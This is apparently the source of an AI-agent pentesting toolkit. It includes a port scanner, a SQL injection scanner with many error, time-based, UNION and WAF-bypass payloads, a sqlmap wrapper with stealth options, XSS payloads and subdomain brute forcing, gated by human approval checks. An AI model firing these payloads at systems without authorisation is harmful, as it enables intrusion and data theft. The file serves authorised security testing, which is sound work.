import json
import requests
import socket
import re
import urllib3
import urllib.parse
import ssl
import hashlib
import base64
import dns.resolver
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from crewai.tools import tool
from typing import Dict, List, Any
from urllib.parse import quote, parse_qs, urlparse
import time
from langchain.tools import tool
from core.checkpoint import require_approval
from core.rate_limiter import rate_limiter
from core.redact import redact
from engines.stealth_engine import stealth_get, stealth_post, stealth
from engines.response_differ import differ
from core.cancellation import check_cancelled

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def _domain_of(url: str) -> str:
    try:
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url

# ==========================================
# GLOBAL EXECUTION LOGGER (Thread-Safe)
# ==========================================
class ExecutionLogger:
    def __init__(self):
        self.logs: List[Dict[str, Any]] = []
        self.lock = threading.Lock()
    
    def add_log(self, tool_name: str, status: str, message: str, details: Dict = None):
        """Log hasil eksekusi tool with timestamp — data sensitif di-redact dulu."""
        with self.lock:
            log_entry = {
                "timestamp": datetime.now().isoformat(),
                "tool": tool_name,
                "status": status,
                "message": redact(message),
                "details": redact(details or {})
            }
            self.logs.append(log_entry)
            print(f"[LOG] {log_entry}")
    
    def get_logs(self) -> List[Dict]:
        """Return all logs"""
        with self.lock:
            return self.logs.copy()
    
    def clear_logs(self):
        """Clear all logs"""
        with self.lock:
            self.logs.clear()
    
    def get_summary(self) -> Dict:
        """Return ringkasan eksekusi"""
        with self.lock:
            tools_executed = set(log["tool"] for log in self.logs)
            errors = [log for log in self.logs if log["status"] == "ERROR"]
            return {
                "total_logs": len(self.logs),
                "tools_executed": list(tools_executed),
                "error_count": len(errors),
                "duration_seconds": self._calculate_duration()
            }
    
    def _calculate_duration(self) -> float:
        if not self.logs:
            return 0
        first = datetime.fromisoformat(self.logs[0]["timestamp"])
        last = datetime.fromisoformat(self.logs[-1]["timestamp"])
        return (last - first).total_seconds()

exec_logger = ExecutionLogger()


# ==========================================
# TOOL 1: ADVANCED ACTIVE RECON (UPGRADED)
# ==========================================
def scan_port(ip, port):
    """Fungsi internal for scanning port super cepat"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((ip, port))
        sock.close()
        if result == 0:
            return port
    except:
        pass
    return None

@tool("Active Recon Target")
def recon_target(url: str) -> str:
    """
    Tool DEEP RECON for Information Gathering tingkat lanjut.
    Executing: DNS Resolution, Fast Port Scanning, Deep WAF Detection, 
    Missing Security Headers, dan Tech-Stack Fingerprinting.
    """
    tool_name = "Active Recon Target"
    exec_logger.add_log(tool_name, "START", f"Starting deep recon for {url}")
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
    
    try:
        print(f"\n[🔍 DEEP RECON] Analyzing medan tempur: {url}...")
        exec_logger.add_log(tool_name, "PROCESSING", "Parsing URL dan DNS resolution")
        
        # 1. Parsing URL & DNS Resolution
        parsed_url = urllib.parse.urlparse(url)
        domain = parsed_url.netloc.split(':')[0]
        try:
            ip_address = socket.gethostbyname(domain)
            exec_logger.add_log(tool_name, "SUCCESS", f"DNS resolved: {domain} → {ip_address}", {"domain": domain, "ip": ip_address})
        except:
            ip_address = "Failed resolve IP"
            exec_logger.add_log(tool_name, "WARNING", "DNS resolution failed", {"domain": domain})

        # 2. Fast Port Scanning (Top 10 Web/Infra Ports)
        exec_logger.add_log(tool_name, "PROCESSING", "Starting port scanning (Top 10 ports)")
        common_ports = [21, 22, 80, 443, 3306, 5432, 8080, 8443, 9000, 27017]
        open_ports = []
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(lambda p: scan_port(ip_address if ip_address != "Failed resolve IP" else "127.0.0.1", p), common_ports)
            open_ports = [p for p in results if p is not None]
        
        exec_logger.add_log(tool_name, "SUCCESS", f"Port scan selesai: {len(open_ports)} port terbuka", {"open_ports": open_ports})

        # 3. HTTP Request for Headers & Body Analysis (with auth + stealth support)
        exec_logger.add_log(tool_name, "PROCESSING", "Analyzing HTTP response headers dan body")
        from core.auth_store import authenticated_request
        response, login_wall = authenticated_request(
            url=url,
            method="GET",
            exec_logger=exec_logger,
        )
        if response is None:
            exec_logger.add_log(tool_name, "ERROR", "Failed melakukan request ke target")
            return json.dumps({"error": "Failed melakukan request ke target"})
        headers = response.headers
        body = response.text.lower()

        # 4. Deep WAF Fingerprinting
        waf_signatures = {
            'Cloudflare': ['cloudflare', '__cfduid', 'cf-ray'],
            'Imperva/Incapsula': ['incapsula', 'visid_incap'],
            'F5 BIG-IP': ['bigip', 'f5'],
            'AWS WAF': ['awselb', 'aws-waf'],
            'Sucuri': ['sucuri/cloudproxy']
        }
        waf_detected = "Not terdeteksi WAF standar"
        for waf_name, sigs in waf_signatures.items():
            if any(sig in str(headers).lower() or sig in body for sig in sigs):
                waf_detected = f"POSITIF {waf_name}"
                exec_logger.add_log(tool_name, "WARNING", f"WAF terdeteksi: {waf_name}", {"waf": waf_name})
                break

        # 5. Missing Security Headers Analysis
        sec_headers = ['Strict-Transport-Security', 'X-Frame-Options', 'X-Content-Type-Options', 'Content-Security-Policy']
        missing_headers = [h for h in sec_headers if h not in headers]
        exec_logger.add_log(tool_name, "SUCCESS", f"Security headers check: {len(missing_headers)} missing", {"missing_headers": missing_headers})

        # 6. Tech-Stack Fingerprinting
        tech_stack = []
        if 'wp-content' in body or 'wordpress' in body: tech_stack.append("WordPress")
        if 'laravel_session' in str(headers).lower(): tech_stack.append("Laravel")
        if 'PHPSESSID' in str(headers): tech_stack.append("PHP")
        if 'express' in headers.get('X-Powered-By', '').lower(): tech_stack.append("Express.js / Node.js")
        if 'react' in body or 'div id="root"' in body: tech_stack.append("React.js")

        server_type = headers.get('Server', 'Disembunyikan (Good Security)')

        # === MENYUSUN LAPORAN ===
        report = f"""
        === DEEP RECONNAISSANCE REPORT ===
        Target Domain: {domain}
        IP Address: {ip_address}
        
        [+] INFRASTRUCTURE
        - Open Ports (Top 10): {open_ports if open_ports else "Semua port tertutup / Filtered"}
        - Web Server: {server_type}
        - Tech Stack Terdeteksi: {', '.join(tech_stack) if tech_stack else "Not terdeteksi / Obfuscated"}
        
        [+] SECURITY POSTURE
        - WAF Status: {waf_detected}
        - Missing Security Headers: {', '.join(missing_headers) if missing_headers else "Semua aman"}
        
        Status Code: {response.status_code}
        """
        
        exec_logger.add_log(tool_name, "SUCCESS", "Deep recon selesai")
        return report

    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"Recon failed: {str(e)}")
        return f"Recon failed total men. Error: {e}"


# ==========================================
# TOOL 2: SQL Injection Scanner
# ==========================================
@tool("SQL Injection Scanner")
def scan_sql_injection(url: str, params: str = "") -> str:
    """
    Scan for kerentanan SQL Injection on target URL.
    params: comma-separated parameter names (e.g., "id,username,email")
    """
    tool_name = "SQL Injection Scanner"
    exec_logger.add_log(tool_name, "START", f"Starting SQLi scan on {url}")
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"SQL Injection scan on {url}",
        context=f"Params: {params or 'default (id,q,search)'}",
        risk="medium",
        exec_logger=exec_logger,
    )
    if not approved:
        exec_logger.add_log(tool_name, "BLOCKED", "Scan cancelled: approval rejected/timeout/no-context")
        return "SCAN DIBATALKAN: human-in-the-loop approval rejected atau timeout."

    domain = _domain_of(url)
    try:
        # ── COMPREHENSIVE PAYLOAD LIBRARY ──────────────────────────────────────
        # Error-based payloads
        error_payloads = [
            "'",
            "''",
            "' OR '1'='1",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "' OR 1=1/*",
            "admin' --",
            "admin' #",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "') OR 1=1 --",
            "' OR ''='",
            "' OR ''=''",
            "1' OR '1'='1' LIMIT 1 --",
            "1' UNION SELECT NULL --",
            "1' UNION SELECT NULL,NULL --",
            "1' UNION SELECT NULL,NULL,NULL --",
            "' UNION SELECT 1,2,3 --",
            "' UNION ALL SELECT NULL --",
            "' UNION ALL SELECT NULL,NULL --",
            "' AND 1=CONVERT(int,(SELECT @@version)) --",
            "' AND 1=1 WAITFOR DELAY '0:0:5' --",
            "1; SELECT 1 --",
            "' OR SLEEP(5) --",
            "1' OR '1'='1' LIMIT 1 OFFSET 0 --",
            "1' OR '1'='1' LIMIT 1 OFFSET 1 --",
            "admin' OR '1'='1",
            "' UNION SELECT username,password FROM users --",
            "' UNION SELECT table_name FROM information_schema.tables --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "1' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 64 --",
            "1' AND LENGTH(database()) > 5 --",
            "1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --",
            "1' ORDER BY 1 --",
            "1' ORDER BY 10 --",
            "1' GROUP BY columnnames HAVING 1=1 --",
        ]

        # Time-based payloads (per DB)
        time_payloads = [
            ("' OR SLEEP(5) --", "MySQL"),
            ("' OR SLEEP(5) #", "MySQL"),
            ("1 OR SLEEP(5)", "MySQL"),
            ("' OR BENCHMARK(10000000,SHA1('test')) --", "MySQL"),
            ("'; WAITFOR DELAY '0:0:5' --", "MSSQL"),
            ("1; WAITFOR DELAY '0:0:5' --", "MSSQL"),
            ("' OR pg_sleep(5) --", "PostgreSQL"),
            ("'; SELECT pg_sleep(5) --", "PostgreSQL"),
            ("1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --", "PostgreSQL"),
            ("' OR 1=(SELECT COUNT(*) FROM all_users) AND SLEEP(5) --", "MySQL"),
            ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --", "MySQL"),
            ("' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --", "MySQL"),
        ]

        # UNION-based payloads
        union_payloads = [
            "' UNION SELECT NULL --",
            "' UNION SELECT NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
            "' UNION ALL SELECT NULL --",
            "' UNION ALL SELECT NULL,NULL --",
            "' UNION ALL SELECT NULL,NULL,NULL --",
            "1 UNION SELECT NULL --",
            "1 UNION SELECT NULL,NULL --",
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT 1,2,3,4 --",
            "' UNION SELECT 1,2,3,4,5 --",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL --",
            "0 UNION SELECT NULL,NULL,NULL --",
            "-1 UNION SELECT NULL,NULL,NULL --",
        ]

        # WAF bypass payloads
        waf_bypass_payloads = [
            "'/*!50000OR*/'1'='1",
            "'/*!OR*/'1'='1",
            "'%20OR%20'1'='1",
            "' OR '1'='1'--",
            "' OR/**/'1'='1",
            "' OR'1'='1",
            "' oR '1'='1",
            "' Or '1'='1",
            "' or 1=1--",
            "' OR 1=1 LIMIT 1--",
            "' /*!OR*/ 1=1--",
            "' %0aOR%0a1=1--",
            "' %0d%0aOR%0d%0a1=1--",
            "' OR''='",
            "') OR('1'='1",
            "1' /*!UNION*/ /*!SELECT*/ NULL,NULL,NULL--",
            "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
            "1' /*!ORDER*/ /*!BY*/ 1--",
            "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
            "admin'/*!--",
            "' OR'1'='1' LIMIT 1--",
        ]

        # Combine all payloads
        all_payloads = list(set(error_payloads + union_payloads + waf_bypass_payloads))

        # Paired Semantic Testing — kirim dua payload that harusnya hasil beda
        semantic_pairs = {
            "numeric": [("1+0", "1+1"), ("1", "2"), ("0", "1")],
            "string": [("test", "test' OR '1'='1"), ("a", "b"), ("normal", "normal'--")],
        }
        
        param_list = [p.strip() for p in params.split(',')] if params else ["id", "q", "search", "user", "page", "cat", "item"]
        vulnerabilities = []
        seen_params = set()  # Deduplication — satu finding per parameter
        
        exec_logger.add_log(tool_name, "PROCESSING", f"Testing {len(param_list)} parameters with {len(all_payloads)} payloads + {len(time_payloads)} time-based + semantic pairs")
        
        # Capture baseline using response differ
        baseline = differ.capture_baseline(url)
        
        for param in param_list:
            if param in seen_params:
                continue  # Skip duplicate params
            
            # Determine param type (numeric or string)
            is_numeric = any(c.isdigit() for c in param) or param.lower() in ("id", "nip", "nim", "user_id", "page", "cat", "item")
            param_type = "numeric" if is_numeric else "string"
            pairs = semantic_pairs[param_type]

            # ── Phase 1: Error-based & UNION payloads ─────────────────────────
            for payload in all_payloads[:40]:  # Limit to top 40
                try:
                    rate_limiter.wait(domain)
                    test_url = f"{url}?{param}={quote(payload)}"
                    response = requests.get(test_url, timeout=5, verify=False)
                    
                    # Use response differ for smarter detection
                    diff = differ.compare(baseline, response, payload=payload, param=param)
                    
                    # High vulnerability score = likely vulnerable
                    if diff["vulnerability_score"] >= 0.5:
                        # Confirmation step: kirim safe payload for verifikasi
                        _baseline_ref = dict(baseline)
                        diff["_baseline"] = _baseline_ref
                        confirmation = differ.confirm_detection(url, param, diff)
                        
                        if confirmation["is_false_positive"]:
                            exec_logger.add_log(
                                tool_name, "INFO",
                                f"FP detected on {param}: {confirmation['reason'][:100]}"
                            )
                            continue  # Skip false positive
                        
                        # Phase 2: Paired Semantic Testing
                        pair_confirmed = False
                        for pair_a, pair_b in pairs:
                            try:
                                rate_limiter.wait(domain)
                                url_a = f"{url}?{param}={quote(pair_a)}"
                                resp_a = requests.get(url_a, timeout=5, verify=False)
                                
                                rate_limiter.wait(domain)
                                url_b = f"{url}?{param}={quote(pair_b)}"
                                resp_b = requests.get(url_b, timeout=5, verify=False)
                                
                                # Check: A == baseline dan B != baseline
                                a_matches_baseline = (resp_a.text == baseline.get("body", ""))
                                b_differs_baseline = (resp_b.text != baseline.get("body", ""))
                                
                                if a_matches_baseline and b_differs_baseline:
                                    pair_confirmed = True
                                    break
                                # Check: A == B (both error = FP)
                                elif resp_a.text == resp_b.text:
                                    pair_confirmed = False
                                    exec_logger.add_log(tool_name, "INFO", f"Semantic pair failed for {param}: both responses identical")
                                    break
                            except Exception as e:
                                exec_logger.add_log(tool_name, "WARNING", f"Semantic test error: {str(e)[:100]}")
                                continue

                        if not pair_confirmed:
                            exec_logger.add_log(tool_name, "INFO", f"Semantic test inconclusive for {param}")
                            continue  # Skip — not confirmed

                        # ── SQLMAP CONFIRMATION STEP ────────────────────────────
                        sqlmap_result = _run_sqlmap_confirmation(url, param, exec_logger)
                        
                        if sqlmap_result.get("is_confirmed"):
                            # sqlmap confirmed - use its findings
                            vulnerabilities.append({
                                "parameter": param,
                                "payload": payload,
                                "type": f"SQL Injection ({sqlmap_result.get('db_type', 'Unknown')})",
                                "status_code": response.status_code,
                                "severity": sqlmap_result.get("severity", "Critical"),
                                "evidence": sqlmap_result.get("evidence", diff["diff_summary"]),
                                "score": 1.0,
                                "confirmed": True,
                                "semantic_test": "passed",
                                "sqlmap_confirmed": True,
                                "db_type": sqlmap_result.get("db_type"),
                                "injection_details": sqlmap_result.get("injection_details", []),
                            })
                        else:
                            # sqlmap didn't confirm - still keep our finding but with lower confidence
                            vulnerabilities.append({
                                "parameter": param,
                                "payload": payload,
                                "type": "Error/UNION-based SQLi (Custom detection)",
                                "status_code": response.status_code,
                                "severity": "Medium",
                                "evidence": diff["diff_summary"],
                                "score": diff["vulnerability_score"],
                                "confirmed": True,
                                "semantic_test": "passed",
                                "sqlmap_confirmed": False,
                                "note": "Detected by custom scanner, not confirmed by sqlmap",
                            })
                        seen_params.add(param)
                        exec_logger.add_log(tool_name, "WARNING", f"Confirmed SQLi: {param} (score: {diff['vulnerability_score']:.2f})", 
                                          {"param": param, "payload": payload, "evidence": diff["diff_summary"]})
                        break  # One finding per param
                except Exception as e:
                    exec_logger.add_log(tool_name, "WARNING", f"SQLi test error for {param}: {str(e)[:100]}")

            # ── Phase 2: Time-based payloads ──────────────────────────────────
            if param not in seen_params:
                for payload, db_type in time_payloads:
                    try:
                        rate_limiter.wait(domain)
                        test_url = f"{url}?{param}={quote(payload)}"
                        
                        # Time consistency check — kirim 2x
                        delays = []
                        for _ in range(2):
                            import time
                            start = time.time()
                            response = requests.get(test_url, timeout=12, verify=False)
                            elapsed = time.time() - start
                            delays.append(elapsed)
                        
                        # Semua delay must > 4 detik
                        if all(d >= 4.0 for d in delays):
                            avg_delay = sum(delays) / len(delays)
                            vulnerabilities.append({
                                "parameter": param,
                                "payload": payload,
                                "type": f"Time-based Blind SQLi ({db_type})",
                                "status_code": response.status_code,
                                "severity": "Critical",
                                "evidence": f"Consistent delay: {avg_delay:.1f}s avg (2/2 slow)",
                                "score": 0.9,
                                "confirmed": True,
                                "db_type": db_type,
                            })
                            seen_params.add(param)
                            exec_logger.add_log(tool_name, "WARNING", f"Time-based SQLi confirmed: {param}, DB={db_type}, delay={avg_delay:.1f}s")
                            break
                    except requests.Timeout:
                        # Timeout juga can indikasi success
                        vulnerabilities.append({
                            "parameter": param,
                            "payload": payload,
                            "type": f"Time-based Blind SQLi ({db_type}, Timeout)",
                            "status_code": 0,
                            "severity": "Critical",
                            "evidence": "Request timed out — sleep injection likely successful",
                            "score": 0.85,
                            "confirmed": True,
                            "db_type": db_type,
                        })
                        seen_params.add(param)
                        exec_logger.add_log(tool_name, "WARNING", f"Time-based SQLi timeout: {param}, DB={db_type}")
                        break
                    except Exception as e:
                        exec_logger.add_log(tool_name, "WARNING", f"Time-based test error for {param}: {str(e)[:100]}")
        
        if vulnerabilities:
            exec_logger.add_log(tool_name, "SUCCESS", f"Found {len(vulnerabilities)} potential SQLi vulnerabilities")
            return json.dumps({
                "status": "VULNERABLE",
                "vulnerabilities": vulnerabilities,
                "count": len(vulnerabilities)
            }, indent=2)
        else:
            exec_logger.add_log(tool_name, "SUCCESS", "No SQLi vulnerabilities detected")
            return json.dumps({
                "status": "SAFE",
                "vulnerabilities": [],
                "message": "Target appears to be protected against SQLi"
            }, indent=2)
    
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"SQLi scan failed: {str(e)}")
        return f"SQLi scan error: {e}"


def _run_sqlmap_confirmation(url: str, param: str, exec_logger) -> dict:
    """
    Run sqlmap sebagai confirmation step.
    Return dict with is_confirmed, details, severity.
    """
    import subprocess
    import json
    import os
    import tempfile

    tool_name = "SQLi Confirmation (sqlmap)"
    exec_logger.add_log(tool_name, "PROCESSING", f"Running sqlmap on {url} param={param}")

    try:
        # Create temp output file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            output_file = f.name

        # Run sqlmap with batch mode (non-interactive)
        cmd = [
            "sqlmap",
            "-u", f"{url}?{param}=1",
            "--batch",
            "--threads=4",
            "--output-dir=/tmp/sqlmap_output",
            "--flush-session",
            "--forms",
            "--crawl=0",
            "--level=3",
            "--risk=2",
        ]

        # Apply stealth mode if enabled
        if os.environ.get("STEALTH_MODE", "0") == "1":
            cmd.extend([
                "--random-agent",
                "--delay=1",
                "--threads=1",
                "--timeout=30",
            ])

        result = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=120,  # 2 minute timeout
        )

        # Parse sqlmap output
        output = result.stdout + result.stderr

        # Check for vulnerability indicators
        vulnerable_indicators = [
            "is vulnerable",
            "injectable",
            "Parameter:",
            "Type:",
            "Title:",
            "Payload:",
            "back-end DBMS:",
        ]

        is_vulnerable = any(indicator.lower() in output.lower() for indicator in vulnerable_indicators)

        # Extract DB type if found
        db_type = "Unknown"
        db_indicators = ["MySQL", "PostgreSQL", "Microsoft SQL Server", "Oracle", "SQLite", "MariaDB"]
        for db in db_indicators:
            if db.lower() in output.lower():
                db_type = db
                break

        # Extract injection details
        injection_details = []
        lines = output.split('\n')
        for i, line in enumerate(lines):
            if "Type:" in line or "Title:" in line or "Payload:" in line:
                injection_details.append(line.strip())

        # Determine severity
        severity = "High"
        if is_vulnerable:
            if "stacked queries" in output.lower():
                severity = "Critical"
            elif "UNION" in output:
                severity = "Critical"
            elif "time-based" in output.lower():
                severity = "Critical"
            elif "boolean-based" in output.lower():
                severity = "High"
            elif "error-based" in output.lower():
                severity = "High"

        # Cleanup
        try:
            os.unlink(output_file)
        except:
            pass

        if is_vulnerable:
            exec_logger.add_log(tool_name, "WARNING",
                f"sqlmap CONFIRMED: {param} is vulnerable ({db_type})")
            return {
                "is_confirmed": True,
                "severity": severity,
                "db_type": db_type,
                "injection_details": injection_details[:10],
                "evidence": output[:500],
                "tool": "sqlmap",
            }
        else:
            exec_logger.add_log(tool_name, "INFO",
                f"sqlmap: {param} not confirmed as vulnerable")
            return {
                "is_confirmed": False,
                "severity": "Low",
                "tool": "sqlmap",
                "note": "sqlmap could not confirm vulnerability",
            }

    except subprocess.TimeoutExpired:
        exec_logger.add_log(tool_name, "WARNING", "sqlmap timed out after 120s")
        return {
            "is_confirmed": False,
            "severity": "Low",
            "tool": "sqlmap",
            "note": "sqlmap execution timed out",
        }
    except FileNotFoundError:
        exec_logger.add_log(tool_name, "WARNING", "sqlmap not found - skipping external confirmation")
        return {
            "is_confirmed": False,
            "severity": "Low",
            "tool": "sqlmap",
            "note": "sqlmap not installed",
        }
    except Exception as e:
        exec_logger.add_log(tool_name, "WARNING", f"sqlmap error: {str(e)[:100]}")
        return {
            "is_confirmed": False,
            "severity": "Low",
            "tool": "sqlmap",
            "note": f"sqlmap error: {str(e)[:100]}",
        }


# ==========================================
# TOOL 3: XSS/CSRF Detector
# ==========================================
@tool("XSS & CSRF Detector")
def detect_xss_csrf(url: str) -> str:
    """
    Deteksi kerentanan XSS dan CSRF on target.
    """
    tool_name = "XSS & CSRF Detector"
    exec_logger.add_log(tool_name, "START", f"Starting XSS/CSRF detection on {url}")
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"XSS/CSRF scan on {url}",
        context="Sending payload script reflected-XSS ke parameter 'test'",
        risk="medium",
        exec_logger=exec_logger,
    )
    if not approved:
        exec_logger.add_log(tool_name, "BLOCKED", "Scan cancelled: approval rejected/timeout/no-context")
        return "SCAN DIBATALKAN: human-in-the-loop approval rejected atau timeout."

    domain = _domain_of(url)
    try:
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror='alert(1)'>",
            "<svg onload='alert(1)'>",
            "javascript:alert(1)",
            "<iframe src='javascript:alert(1)'>"
        ]
        
        findings = {
            "xss_vulnerabilities": [],
            "csrf_findings": [],
            "missing_csrf_tokens": False
        }
        
        exec_logger.add_log(tool_name, "PROCESSING", "Scanning for XSS vectors")
        
        # Test XSS
        for payload in xss_payloads:
            try:
                rate_limiter.wait(domain)
                test_url = f"{url}?test={quote(payload)}"
                response = requests.get(test_url, timeout=5, verify=False)
                
                if payload in response.text:
                    findings["xss_vulnerabilities"].append({
                        "type": "Reflected XSS",
                        "payload": payload,
                        "severity": "High"
                    })
                    exec_logger.add_log(tool_name, "WARNING", "Reflected XSS detected", {"payload": payload})
            except:
                pass
        
        # Check CSRF tokens
        exec_logger.add_log(tool_name, "PROCESSING", "Checking CSRF protection")
        response = requests.get(url, timeout=5, verify=False)
        csrf_indicators = ['csrf_token', 'authenticity_token', '__token', '_token', 'nonce']
        
        if not any(indicator in response.text.lower() for indicator in csrf_indicators):
            findings["missing_csrf_tokens"] = True
            exec_logger.add_log(tool_name, "WARNING", "CSRF tokens not found")
        else:
            exec_logger.add_log(tool_name, "SUCCESS", "CSRF protection terdeteksi")
        
        exec_logger.add_log(tool_name, "SUCCESS", "XSS/CSRF detection selesai")
        return json.dumps(findings, indent=2)
    
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"XSS/CSRF detection error: {str(e)}")
        return f"XSS/CSRF detection error: {e}"


# ==========================================
# TOOL 4: SSL/TLS Certificate Analyzer
# ==========================================
@tool("SSL/TLS Analyzer")
def analyze_ssl_tls(domain: str) -> str:
    """
    Analisis SSL/TLS certificate, encryption strength, dan MITM indicators.
    """
    tool_name = "SSL/TLS Analyzer"
    exec_logger.add_log(tool_name, "START", f"Analyzing SSL/TLS for {domain}")
    if check_cancelled(exec_logger): return "CANCELLED: job cancelled by user."
    
    try:
        exec_logger.add_log(tool_name, "PROCESSING", "Connecting to server and extracting certificate")
        
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
        
        findings = {
            "domain": domain,
            "cipher_suite": cipher[0] if cipher else "Unknown",
            "protocol_version": cipher[1] if cipher else "Unknown",
            "certificate_subject": cert.get('subject', []),
            "certificate_issuer": cert.get('issuer', []),
            "not_before": cert.get('notBefore', 'Unknown'),
            "not_after": cert.get('notAfter', 'Unknown'),
            "vulnerabilities": []
        }
        
        # Check for weak ciphers
        if cipher:
            cipher_name = cipher[0].lower()
            weak_ciphers = ['null', 'export', 'rc4', 'md5', 'des']
            if any(weak in cipher_name for weak in weak_ciphers):
                findings["vulnerabilities"].append({
                    "type": "Weak Cipher Suite",
                    "cipher": cipher_name,
                    "severity": "Medium"
                })
                exec_logger.add_log(tool_name, "WARNING", f"Weak cipher detected: {cipher_name}")
        
        # Check for MITM indicators
        # 1. Certificate issuer mismatch
        issuer = str(cert.get('issuer', ''))
        subject = str(cert.get('subject', ''))
        if 'Let\'s Encrypt' in issuer and domain not in subject:
            findings["vulnerabilities"].append({
                "type": "Certificate Issuer Mismatch",
                "severity": "High",
                "detail": f"Issuer: {issuer[:100]}, Subject: {subject[:100]}",
                "mitm_risk": "Possible MITM — certificate issued for different domain"
            })
            exec_logger.add_log(tool_name, "WARNING", "Certificate issuer mismatch detected")
        
        # 2. Self-signed certificate
        if issuer == subject:
            findings["vulnerabilities"].append({
                "type": "Self-Signed Certificate",
                "severity": "High",
                "detail": "Certificate is self-signed — MITM possible",
                "mitm_risk": "Self-signed certificates are easily spoofed"
            })
            exec_logger.add_log(tool_name, "WARNING", "Self-signed certificate detected")
        
        # 3. Expired certificate
        try:
            not_after = cert.get('notAfter', '')
            if not_after:
                exp_date = ssl.cert_time_to_seconds(not_after)
                if exp_date < time.time():
                    findings["vulnerabilities"].append({
                        "type": "Expired Certificate",
                        "severity": "High",
                        "detail": f"Certificate expired: {not_after}",
                        "mitm_risk": "Expired certificates indicate poor security hygiene"
                    })
                    exec_logger.add_log(tool_name, "WARNING", "Expired certificate detected")
        except Exception:
            pass
        
        # 4. Weak protocol version
        protocol = cipher[1] if cipher else ""
        if 'TLSv1.0' in protocol or 'TLSv1.1' in protocol or 'SSLv3' in protocol:
            findings["vulnerabilities"].append({
                "type": "Weak Protocol Version",
                "severity": "High",
                "detail": f"Protocol: {protocol} — vulnerable to BEAST, POODLE, DROWN",
                "mitm_risk": "Weak protocols allow traffic decryption"
            })
            exec_logger.add_log(tool_name, "WARNING", f"Weak protocol: {protocol}")
        
        # 5. Check HSTS header
        try:
            import requests
            rate_limiter.wait(domain)
            resp = requests.get(f"https://{domain}", timeout=5, verify=False, allow_redirects=False)
            hsts = resp.headers.get('Strict-Transport-Security', '')
            if not hsts:
                findings["vulnerabilities"].append({
                    "type": "Missing HSTS",
                    "severity": "Medium",
                    "detail": "No Strict-Transport-Security header — SSL stripping possible",
                    "mitm_risk": "Without HSTS, first connection can be intercepted"
                })
                exec_logger.add_log(tool_name, "WARNING", "Missing HSTS header")
        except Exception:
            pass
        
        exec_logger.add_log(tool_name, "SUCCESS", "SSL/TLS analysis complete")
        return json.dumps(findings, indent=2)
    
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"SSL/TLS analysis failed: {str(e)}")
        return f"SSL/TLS analysis error: {e}"


# ==========================================
# TOOL 5: DNS Enumeration & Enumeration
# ==========================================
@tool("DNS & Subdomain Enumerator")
def enumerate_dns_subdomains(domain: str) -> str:
    """
    Enumerate DNS records dan discover subdomains.
    """
    tool_name = "DNS & Subdomain Enumerator"
    exec_logger.add_log(tool_name, "START", f"Starting DNS enumeration for {domain}")
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
    
    try:
        exec_logger.add_log(tool_name, "PROCESSING", "Querying DNS records (A, MX, NS, TXT)")
        
        dns_records = {
            "domain": domain,
            "A_records": [],
            "MX_records": [],
            "NS_records": [],
            "TXT_records": [],
            "subdomains": []
        }
        
        try:
            # A Records
            answers = dns.resolver.resolve(domain, 'A')
            dns_records["A_records"] = [str(rdata) for rdata in answers]
            exec_logger.add_log(tool_name, "SUCCESS", f"A records found: {len(dns_records['A_records'])}")
        except:
            exec_logger.add_log(tool_name, "WARNING", "Could not resolve A records")
        
        try:
            # MX Records
            answers = dns.resolver.resolve(domain, 'MX')
            dns_records["MX_records"] = [str(rdata) for rdata in answers]
            exec_logger.add_log(tool_name, "SUCCESS", f"MX records found: {len(dns_records['MX_records'])}")
        except:
            pass
        
        try:
            # NS Records
            answers = dns.resolver.resolve(domain, 'NS')
            dns_records["NS_records"] = [str(rdata) for rdata in answers]
            exec_logger.add_log(tool_name, "SUCCESS", f"NS records found: {len(dns_records['NS_records'])}")
        except:
            pass
        
        # Common subdomains brute force
        common_subdomains = ['www', 'mail', 'ftp', 'api', 'admin', 'test', 'dev', 'staging', 'cdn']
        exec_logger.add_log(tool_name, "PROCESSING", f"Attempting subdomain discovery ({len(common_subdomains)} common names)")
        
        for sub in common_subdomains:
            try:
                full_domain = f"{sub}.{domain}"
                socket.gethostbyname(full_domain)
                dns_records["subdomains"].append(full_domain)
                exec_logger.add_log(tool_name, "SUCCESS", f"Subdomain found: {full_domain}")
            except:
